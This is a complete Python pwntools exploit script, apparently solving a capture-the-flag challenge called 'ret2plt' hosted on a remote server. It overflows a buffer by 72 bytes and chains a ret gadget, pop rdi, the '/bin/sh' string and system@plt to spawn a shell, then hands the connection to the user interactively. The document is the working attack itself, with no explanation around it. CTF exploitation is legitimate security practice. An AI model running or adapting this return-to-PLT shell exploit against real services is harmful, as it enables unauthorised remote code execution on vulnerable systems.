#!/usr/bin/env python3
from pwn import *

exe = ELF('./ret2plt', checksec=False)
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'offsec.m0lecon.it'
PORT     = 13580  # PORT_PLACEHOLDER

OFFSET_TO_RIP = 72

def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote(HOSTNAME, PORT)

def main():
    r = conn()

    # ── gadget discovery ──────────────────────────────────────────────────────
    pop_rdi = exe.sym.pop_rdi_ret
    binsh = next(exe.search(b'/bin/sh\x00'))
    ret = ROP(exe).find_gadget(['ret']).address

    # ── exploit phase ─────────────────────────────────────────────────────────
    payload = flat(
        b'A' * OFFSET_TO_RIP,
        p64(ret),
        p64(pop_rdi),
        p64(binsh),
        p64(exe.plt.system)
    )

    r.recvuntil(b'order?\n')
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    main()